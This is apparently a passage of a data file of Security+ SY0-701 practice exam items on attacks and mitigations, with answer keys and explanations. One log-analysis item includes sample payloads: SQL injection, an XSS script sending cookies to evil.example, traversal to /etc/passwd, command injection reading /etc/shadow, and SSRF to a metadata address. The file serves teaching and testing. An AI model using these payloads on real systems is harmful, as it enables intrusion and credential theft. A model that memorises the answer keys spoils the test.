    explanation: "Credential replay reuses captured authentication material, such as an NTLM password hash (pass-the-hash) or a session token, to authenticate as the victim without knowing the password. Password spraying and brute force guess passwords, a birthday attack finds hash collisions, and a downgrade attack weakens encryption.",
    hint: "Reuse what was captured instead of guessing = replay.",
    refs: [
      { title: "MITRE ATT&CK T1550.002 Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
      { title: "Professor Messer SY0-701: Replay Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/replay-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-053", domain: 2, objective: "2.4", topic: "Application attack log analysis", type: "match",
    stems: [
      "A security analyst reviews entries from a web application firewall log. Match each log entry with the attack it most likely indicates."
    ],
    pairs: [
      { item: "GET /item.php?id=7' OR '1'='1' --", answer: "SQL injection" },
      { item: "POST /comment body=<script>fetch('https://evil.example/?c='+document.cookie)</script>", answer: "Cross-site scripting" },
      { item: "GET /download?file=../../../../etc/passwd", answer: "Directory traversal" },
      { item: "GET /tools/ping?host=10.0.0.5;cat%20/etc/shadow", answer: "Command injection" },
      { item: "POST /login username=AAAA...(6,000 'A' characters), followed by a service crash", answer: "Buffer overflow" },
      { item: "GET /preview?url=http://169.254.169.254/latest/meta-data/", answer: "Server-side request forgery" }
    ],
    extraOptions: ["Cross-site request forgery", "Replay attack"],
    explanation: "Quotes with OR '1'='1' and -- target the SQL query. A <script> tag that sends document.cookie is XSS. Repeated ../ sequences climb out of the web root (directory traversal). A semicolon followed by a shell command is command injection. A very long string that crashes the service suggests a buffer overflow. Making the server fetch an internal metadata address is SSRF.",
    hint: "Look for the tell: quote/OR, <script>, ../, ;command, AAAA, internal URL.",
    refs: [
      { title: "OWASP Top 10: A03 Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
      { title: "OWASP: Path Traversal", url: "https://owasp.org/www-community/attacks/Path_Traversal" },
      { title: "OWASP: Server Side Request Forgery", url: "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" }
    ]
  },
  {
    id: "d2-054", domain: 2, objective: "2.4", topic: "Cross-site request forgery", type: "single",
    stems: [
      "A bank customer who is logged in to online banking visits a forum page that contains a hidden form. The form silently sends a funds transfer request to the bank with the customer's active session. Which of the following attacks is this?",
      "A developer adds a unique anti-forgery token to every state-changing form in a web application. Which of the following attacks is the developer trying to prevent?"
    ],
    correct: ["Cross-site request forgery"],
    wrong: ["Cross-site scripting", "Server-side request forgery", "SQL injection", "Directory traversal"],
    explanation: "Cross-site request forgery (CSRF) makes a victim's browser send an unwanted request to a site where the victim is already logged in, so the site trusts it. Anti-CSRF tokens stop this because the attacker cannot know the token. XSS injects script into a page, SSRF makes the server send requests, and SQL injection and directory traversal target the server's database and files.",
    hint: "The victim's own browser and session do the attacker's request = CSRF.",
    refs: [
      { title: "OWASP: Cross Site Request Forgery (CSRF)", url: "https://owasp.org/www-community/attacks/csrf" },
      { title: "OWASP CSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" },
      { title: "Professor Messer SY0-701: Application Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/application-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-055", domain: 2, objective: "2.4", topic: "Server-side request forgery", type: "single",
    stems: [
      "A web application's 'import image from URL' feature logs a request to http://169.254.169.254/latest/meta-data/iam/security-credentials/. Which of the following attacks is most likely being attempted?",
      "An attacker makes a vulnerable web server send HTTP requests to internal-only systems that the attacker cannot reach directly. Which of the following attacks is this?"
    ],
    correct: ["Server-side request forgery"],
    wrong: ["Cross-site request forgery", "Cross-site scripting", "Directory traversal", "SQL injection"],
    explanation: "Server-side request forgery (SSRF) tricks a server into making requests for the attacker, often to internal services such as the cloud metadata address 169.254.169.254, which can expose credentials. CSRF abuses the user's browser instead of the server. XSS runs script in browsers, and directory traversal and SQL injection read files or query databases directly.",
    hint: "The server fetches an internal URL for the attacker = SSRF.",
    refs: [
      { title: "OWASP: Server Side Request Forgery", url: "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" },
      { title: "Professor Messer SY0-701: Application Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/application-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-056", domain: 2, objective: "2.4", topic: "Privilege escalation", type: "single",
    stems: [
      "A user with a standard account runs an exploit against a vulnerable Windows service and gets a command shell that runs as SYSTEM. Which of the following attacks occurred?",
      "On a web application, a customer changes the account ID in a URL and can then view and edit another customer's orders. Which of the following best describes this attack?",
      "Which of the following attacks gives an attacker higher permissions, or another user's permissions, beyond what the attacker was originally granted?"
    ],
    correct: ["Privilege escalation"],
    wrong: ["Replay attack", "Directory traversal", "Downgrade attack", "Cross-site scripting"],
    explanation: "Privilege escalation gains rights that the attacker should not have. Vertical escalation moves to higher rights, such as user to SYSTEM. Horizontal escalation moves to another user's rights at the same level. Patching and least privilege limit it. Replay reuses captured data, directory traversal reads files outside the web root, and downgrade and XSS are unrelated.",
    hint: "User to admin = vertical; user A to user B = horizontal. Both are privilege escalation.",
    refs: [
      { title: "MITRE ATT&CK TA0004 Privilege Escalation", url: "https://attack.mitre.org/tactics/TA0004/" },
      { title: "CAPEC-233: Privilege Escalation", url: "https://capec.mitre.org/data/definitions/233.html" },
      { title: "Professor Messer SY0-701: Application Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/application-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-057", domain: 2, objective: "2.4", topic: "Downgrade attack", type: "single",
    stems: [
      "An attacker on a cafe's network sits between a user and a website, rewrites HTTPS links to HTTP, and reads the user's credentials in cleartext. Which of the following attacks is this?",
      "During a TLS handshake, an on-path attacker changes the messages so that the client and server agree on an older, weaker protocol version. Which of the following attacks is this?",
      "Which of the following attacks forces systems to use a weaker encryption method, or no encryption at all?"
    ],
    correct: ["Downgrade attack"],
    wrong: ["Collision attack", "Birthday attack", "Replay attack", "Password spraying"],
    explanation: "A downgrade attack forces a connection to use a weaker protocol or cipher, or no encryption. SSL stripping is a common example that turns HTTPS into HTTP. Disabling old protocol versions and using HSTS help prevent it. Collision and birthday attacks target hash functions, replay reuses captured data, and password spraying guesses passwords.",
    hint: "Weaker version or SSL stripping = downgrade.",
    refs: [
      { title: "Professor Messer SY0-701: Cryptographic Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/cryptographic-attacks-sy0-701/" },
      { title: "CWE-757: Selection of Less-Secure Algorithm During Negotiation", url: "https://cwe.mitre.org/data/definitions/757.html" },
      { title: "RFC 7457: Summarizing Known Attacks on TLS and DTLS", url: "https://www.rfc-editor.org/rfc/rfc7457" }
    ]
  },
  {
    id: "d2-058", domain: 2, objective: "2.4", topic: "Hash collision", type: "single",
    stems: [
      "Researchers create two different PDF files that produce the same MD5 hash value. Which of the following describes this result?",
      "An attacker creates a fake certificate that has the same MD5 digest as a legitimate certificate that a CA signed, so the CA's signature appears valid on the fake certificate. Which of the following made this attack possible?"
    ],
    correct: ["Hash collision"],
    wrong: ["Downgrade attack", "Replay attack", "Rainbow table attack", "Pass-the-hash"],
    explanation: "A collision occurs when two different inputs produce the same hash value. MD5 collisions are practical, which is why MD5 must not be used for signatures or integrity. A downgrade weakens a protocol, replay reuses captured messages, a rainbow table reverses unsalted password hashes, and pass-the-hash reuses a password hash to log in.",
    hint: "Two different inputs, one hash = collision.",
    refs: [
      { title: "NIST CSRC Glossary: collision", url: "https://csrc.nist.gov/glossary/term/collision" },
      { title: "RFC 6151: Updated Security Considerations for MD5", url: "https://www.rfc-editor.org/rfc/rfc6151" },
      { title: "Professor Messer SY0-701: Cryptographic Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/cryptographic-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-059", domain: 2, objective: "2.4", topic: "Birthday attack", type: "single",
    stems: [
      "An attacker uses probability math to find two different inputs that produce the same hash, with far fewer attempts than trying every possible value. Which of the following attacks is this?",
      "A cryptographer explains that with only 23 people in a room there is about a 50% chance that two share a birthday, and that attackers apply the same idea to hash functions. Which of the following attacks is being described?",
      "Which of the following attacks is best mitigated by using a hash algorithm with a larger output size?"
    ],
    correct: ["Birthday attack"],
    wrong: ["Downgrade attack", "Replay attack", "Password spraying", "Pass-the-hash", "Directory traversal"],
    explanation: "A birthday attack uses the birthday paradox: matching pairs are found much faster than expected, so hash collisions take far fewer attempts than a full search. A larger hash output makes it impractical. Downgrade, replay, password spraying, pass-the-hash, and directory traversal do not depend on the hash output size.",
    hint: "Birthday paradox math against hashes; defend with a longer hash.",
    refs: [
      { title: "Professor Messer SY0-701: Cryptographic Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/cryptographic-attacks-sy0-701/" },
      { title: "NIST CSRC Glossary: collision resistance", url: "https://csrc.nist.gov/glossary/term/collision_resistance" }
    ]
  },

  // ---------- 2.5 Mitigation techniques ----------
  {
    id: "d2-060", domain: 2, objective: "2.5", topic: "Application allow list", type: "single",
    stems: [
      "A manufacturer wants its plant-floor workstations to run only the five approved control applications and to block everything else, including new and unknown malware. Which of the following is the best mitigation?",
      "A security team sets a policy so that only executables with approved hashes or trusted publisher signatures can run on point-of-sale terminals. Which of the following techniques is this?"
    ],
    correct: ["Application allow list"],
    wrong: ["Application deny list", "Host-based firewall", "Full disk encryption", "Decommissioning"],
    explanation: "An application allow list lets only approved applications run, identified by hash, signature, or path, and blocks everything else, including unknown malware. A deny list blocks only known-bad items, so new malware can still run. A host-based firewall filters network traffic, full disk encryption protects data at rest, and decommissioning retires equipment.",
    hint: "Nothing runs unless it is on the list = allow list.",
    refs: [
      { title: "NIST SP 800-167: Guide to Application Whitelisting", url: "https://csrc.nist.gov/pubs/sp/800/167/final" },
      { title: "NIST CSRC Glossary: application allowlisting", url: "https://csrc.nist.gov/glossary/term/application_allowlisting" },
      { title: "Professor Messer SY0-701: Segmentation and Access Control", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/segmentation-and-access-control-sy0-701/" }
    ]
  },
  {
    id: "d2-061", domain: 2, objective: "2.5", topic: "Segmentation", type: "single",
    stems: [
      "A hospital places all IoT infusion pumps on their own VLAN and uses firewall rules so that the pumps can talk only to the pump management server. Which of the following mitigation techniques is this?",
      "To meet PCI DSS requirements, a retailer separates the cardholder data environment from the rest of the corporate network. Which of the following techniques does this describe?"
    ],
    correct: ["Segmentation"],
    wrong: ["Decommissioning", "Application allow list", "Least privilege", "Configuration enforcement", "Encryption"],
    explanation: "Segmentation divides a network into separate zones, physically, with VLANs, or virtually, and controls traffic between them. It limits how far an attack can spread and is often required by standards such as PCI DSS. The other options control applications, user rights, device posture, or data confidentiality, not network zones.",
    hint: "Separate zones with controlled traffic between them = segmentation.",
    refs: [
      { title: "Professor Messer SY0-701: Segmentation and Access Control", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/segmentation-and-access-control-sy0-701/" },
      { title: "NIST SP 800-41 Rev. 1: Guidelines on Firewalls", url: "https://csrc.nist.gov/pubs/sp/800/41/r1/final" }
    ]
  },
  {
    id: "d2-062", domain: 2, objective: "2.5", topic: "Isolation", type: "single",
    stems: [
      "An EDR tool detects ransomware on a laptop and immediately cuts the laptop off from all network communication except the connection to the EDR console. Which of the following mitigation techniques did the tool apply?",
      "During an incident, a security analyst moves a compromised server to a quarantine network that has no access to other systems, and keeps it powered on for forensics. Which of the following techniques is this?"
    ],
    correct: ["Isolation"],
    wrong: ["Decommissioning", "Patching", "Configuration enforcement", "Application allow list", "Least privilege"],
    explanation: "Isolation separates a compromised or suspect system from everything else so that the threat cannot spread, while the system stays available for analysis. EDR tools can isolate a host automatically. Decommissioning retires a system permanently, patching fixes a flaw, and the other options prevent problems instead of containing an active one.",
    hint: "Cut off the infected host, keep it for analysis = isolation.",
    refs: [
      { title: "Professor Messer SY0-701: Hardening Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardening-techniques-sy0-701/" },
      { title: "NIST SP 800-61 Rev. 2: Incident Handling Guide", url: "https://csrc.nist.gov/pubs/sp/800/61/r2/final" }
    ]
  },
  {
    id: "d2-063", domain: 2, objective: "2.5", topic: "Least privilege", type: "single",
    stems: [
      "An audit finds that all marketing employees have local administrator rights on their laptops, but their jobs need only standard user access. Which of the following principles should the company apply?",
      "A database administrator gives a reporting service account read-only access to two tables instead of full database owner rights. Which of the following mitigation techniques does this show?"
    ],
    correct: ["Least privilege"],
    wrong: ["Segmentation", "Encryption", "Decommissioning", "Monitoring", "Isolation"],
    explanation: "Least privilege gives each user or account only the rights its job needs. If the account is compromised, the attacker gets only those limited rights. Segmentation separates networks, encryption protects data confidentiality, decommissioning retires systems, monitoring detects activity, and isolation contains a compromised host.",
    hint: "Only the rights the job needs = least privilege.",
    refs: [
      { title: "NIST CSRC Glossary: least privilege", url: "https://csrc.nist.gov/glossary/term/least_privilege" },
      { title: "Professor Messer SY0-701: Mitigation Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/mitigation-techniques-sy0-701/" }
    ]
  },
  {
    id: "d2-064", domain: 2, objective: "2.5", topic: "Configuration enforcement", type: "single",
    stems: [
      "Before a laptop can join the corporate network, a NAC posture check confirms that OS patches are current, EDR is running, and the host firewall is on. Noncompliant laptops go to a remediation VLAN. Which of the following mitigation techniques is this?",
      "A company's MDM checks every phone at enrollment and blocks any device that does not meet the required security settings until the user fixes them. Which of the following techniques does this describe?"
    ],
    correct: ["Configuration enforcement"],
    wrong: ["Decommissioning", "Application allow list", "Least privilege", "Encryption"],
    explanation: "Configuration enforcement checks that a device meets the required security configuration, such as patches, EDR, firewall, and certificates, before it can connect. Devices that fail are quarantined until they comply. An allow list controls which applications run, least privilege limits user rights, encryption protects data, and decommissioning retires equipment.",
    hint: "Posture check before access = configuration enforcement.",
    refs: [
      { title: "Professor Messer SY0-701: Mitigation Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/mitigation-techniques-sy0-701/" },
      { title: "NIST SP 800-128: Security-Focused Configuration Management", url: "https://csrc.nist.gov/pubs/sp/800/128/upd1/final" }
    ]
  },
  {
    id: "d2-065", domain: 2, objective: "2.5", topic: "Decommissioning", type: "single",
    stems: [
      "A company retires 40 old file servers. Before the servers leave the building, the IT team wipes or destroys the drives and removes the servers from inventory and DNS. Which of the following mitigation techniques is this?",
      "Which of the following mitigation techniques includes removing sensitive data from storage devices when equipment reaches the end of its useful life?"
    ],
    correct: ["Decommissioning"],
    wrong: ["Isolation", "Patching", "Segmentation", "Monitoring", "Configuration enforcement"],
    explanation: "Decommissioning is the controlled retirement of equipment. It includes sanitizing or destroying storage so that no data remains, and removing the system from inventory and services. Isolation contains a live compromised host, patching fixes flaws, segmentation separates networks, and monitoring watches activity.",
    hint: "End of life + wipe or destroy the drives = decommissioning.",
    refs: [
      { title: "Professor Messer SY0-701: Mitigation Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/mitigation-techniques-sy0-701/" },
      { title: "NIST SP 800-88 Rev. 1: Guidelines for Media Sanitization", url: "https://csrc.nist.gov/pubs/sp/800/88/r1/final" }
    ]
  },
  {
    id: "d2-066", domain: 2, objective: "2.5", topic: "HIPS", type: "single",
    stems: [
      "A systems administrator wants software on each server that uses signatures and behavior analysis to detect and actively block attacks, such as exploit attempts against local services. Which of the following should the administrator install?",
      "A security engineer needs a control on the endpoint itself that can stop a malicious process from making suspicious registry changes in real time. Which of the following is the best choice?"
    ],
    correct: ["Host-based intrusion prevention system"],
    wrong: ["Network-based intrusion detection system", "Host-based firewall", "Full disk encryption", "Data loss prevention"],
    explanation: "A HIPS runs on the host and uses signatures, heuristics, and behavior to detect and block malicious activity, including actions inside the OS such as registry changes. A network IDS only watches network traffic and does not block it. A host-based firewall filters connections by port, address, or application, full disk encryption protects data at rest, and DLP stops data leaks.",
    hint: "On the host + prevents (blocks) = HIPS.",
    refs: [
      { title: "NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems", url: "https://csrc.nist.gov/pubs/sp/800/94/final" },
      { title: "Professor Messer SY0-701: Hardening Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardening-techniques-sy0-701/" }
    ]
  },
  {
    id: "d2-067", domain: 2, objective: "2.5", topic: "Hardening a new system", type: "multi",
    stems: [
      "A systems administrator is hardening a new Linux web server before it goes into production. Which of the following actions should the administrator take?",
      "A security checklist for new network appliances lists the most important hardening steps. Which of the following steps belong on the checklist?"
    ],
    correct: ["Change all default passwords", "Remove unnecessary software"],
    wrong: ["Enable all services for future use", "Enable Telnet for remote management", "Grant all users administrator rights", "Disable logging to save disk space"],
    explanation: "Default passwords are published and easy to guess, so they must be changed. Removing unnecessary software reduces the attack surface and the number of items to patch. Enabling extra services or Telnet adds exposure, broad admin rights break least privilege, and disabling logs removes visibility.",
    hint: "Hardening = remove what is not needed and replace defaults.",
    refs: [
      { title: "Professor Messer SY0-701: Hardening Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardening-techniques-sy0-701/" },
      { title: "NIST SP 800-123: Guide to General Server Security", url: "https://csrc.nist.gov/pubs/sp/800/123/final" },
      { title: "CIS Benchmarks", url: "https://www.cisecurity.org/cis-benchmarks" }
    ]
  },
  {
    id: "d2-068", domain: 2, objective: "2.5", topic: "Disabling ports and protocols", type: "multi",
    stems: [
      "A scan of a server shows '21/tcp open ftp', '22/tcp open ssh', '23/tcp open telnet', and '443/tcp open https'. The server needs only secure remote management and HTTPS. Which of the following actions best harden the server?",
      "A security analyst finds that a core switch still allows management over Telnet and file transfers over FTP. Which of the following changes should the analyst recommend?"
    ],
    correct: ["Disable Telnet and use SSH", "Disable FTP and use SFTP"],
    wrong: ["Move Telnet to TCP port 2323", "Open TCP port 3389 to the internet", "Enable SNMPv1 for monitoring", "Allow anonymous FTP logins"],
    explanation: "Telnet and FTP send credentials in cleartext, so they should be disabled and replaced with encrypted protocols: SSH for management and SFTP for file transfer. Moving Telnet to another port does not encrypt it. Exposing RDP, enabling SNMPv1 (cleartext community strings), and allowing anonymous FTP all increase the attack surface.",
    hint: "Turn off cleartext protocols and use their secure versions.",
    refs: [
      { title: "Professor Messer SY0-701: Hardening Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardening-techniques-sy0-701/" },
      { title: "RFC 4251: The Secure Shell (SSH) Protocol Architecture", url: "https://www.rfc-editor.org/rfc/rfc4251" },
      { title: "CISA: Securing Network Infrastructure Devices", url: "https://www.cisa.gov/news-events/news/securing-network-infrastructure-devices" }
    ]
  },
  {
    id: "d2-069", domain: 2, objective: "2.5", topic: "Compensating controls for legacy systems", type: "multi",
    stems: [
      "A factory must keep a legacy control system that runs an unsupported OS, because the system's vendor no longer exists. The system cannot be patched. Which of the following are the best ways to reduce its risk?",
      "An end-of-life medical device cannot get security updates but must stay in service for another year. Which of the following compensating controls should the security team apply?"
    ],
    correct: ["Place it on an isolated network segment", "Restrict connections with strict firewall rules"],
    wrong: ["Install the latest vendor security patch", "Expose it to the internet for vendor support", "Enable all default services", "Remove its host-based firewall"],
    explanation: "When a legacy or end-of-life system cannot be patched, the risk is reduced by limiting who and what can reach it: put it on its own network segment and allow only the connections it needs. No vendor patch is available, and internet exposure, extra services, or removal of the firewall would increase the attack surface.",
    hint: "Cannot patch it? Wall it off and limit access.",
    refs: [
      { title: "Professor Messer SY0-701: Hardware Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardware-vulnerabilities-sy0-701/" },
      { title: "Professor Messer SY0-701: Segmentation and Access Control", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/segmentation-and-access-control-sy0-701/" }
    ]
  },
  {
    id: "d2-070", domain: 2, objective: "2.5", topic: "Choosing mitigations", type: "match",
    stems: [
      "A security manager lists several risks found during an assessment. Match each risk with the mitigation technique that best addresses it."
    ],
    pairs: [
      { item: "A vendor released a fix for an actively exploited flaw in the company's VPN appliance", answer: "Patching" },
      { item: "Field sales laptops that hold customer data are often lost or stolen", answer: "Encryption" },
      { item: "Interns can modify files in the finance share, but they should only read them", answer: "Access control permissions" },
      { item: "Server and firewall logs are never reviewed, so attacks go unnoticed", answer: "Monitoring" },
      { item: "Laptops on hotel Wi-Fi accept unsolicited inbound connections", answer: "Host-based firewall" },
      { item: "New workstations have no protection to detect and stop malware", answer: "Installation of endpoint protection" }
    ],
    extraOptions: ["Decommissioning", "Application allow list"],
    explanation: "A vendor fix for an exploited flaw calls for patching. Full disk encryption protects data on lost laptops. Correct file permissions (ACLs) limit interns to read access. Central log collection and review (monitoring) finds attacks. A host-based firewall blocks unsolicited inbound traffic on each device, and EDR or antivirus is endpoint protection.",
    hint: "Match the gap: no fix, lost data, too much access, no visibility, open inbound, no anti-malware.",
    refs: [
      { title: "Professor Messer SY0-701: Mitigation Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/mitigation-techniques-sy0-701/" },
      { title: "Professor Messer SY0-701: Hardening Techniques", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardening-techniques-sy0-701/" },
      { title: "NIST SP 800-40 Rev. 4: Enterprise Patch Management Planning", url: "https://csrc.nist.gov/pubs/sp/800/40/r4/final" }
    ]
  },
  {
    id: "d2-071", domain: 2, objective: "2.4", topic: "Ransomware indicators", type: "single",
    stems: [
      "Users at a branch office report that their documents now have a .locked extension and will not open. A note on each desktop says that the files will be released after a cryptocurrency payment. Which of the following types of malware is most likely responsible?",
      "The help desk receives many calls: files on the shared drives are missing, and each workstation shows a full-screen lock message that tells users to email an unknown address for instructions. Which of the following attacks is most likely occurring?",
      "Which of the following types of malware blocks access to a victim's data or system, usually with encryption, until the victim pays the attacker?"
    ],
    correct: ["Ransomware"],
    wrong: ["Rootkit", "Spyware", "Bloatware", "Keylogger", "Logic bomb", "Worm"],
    explanation: "Ransomware encrypts or locks data and systems, then shows a demand for payment or contact with the attacker. Missing or unreadable files together with a lock screen or ransom note are its classic indicators. A rootkit hides deep in the operating system, spyware and keyloggers secretly collect information, bloatware is unwanted preinstalled software, a logic bomb waits for a trigger, and a worm spreads by itself.",
    hint: "Locked or missing files + a demand to pay or make contact = ransomware.",
    refs: [
      { title: "Professor Messer SY0-701: An Overview of Malware", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/an-overview-of-malware-sy0-701/" },
      { title: "CISA: StopRansomware", url: "https://www.cisa.gov/stopransomware" }
    ]
  }
]);
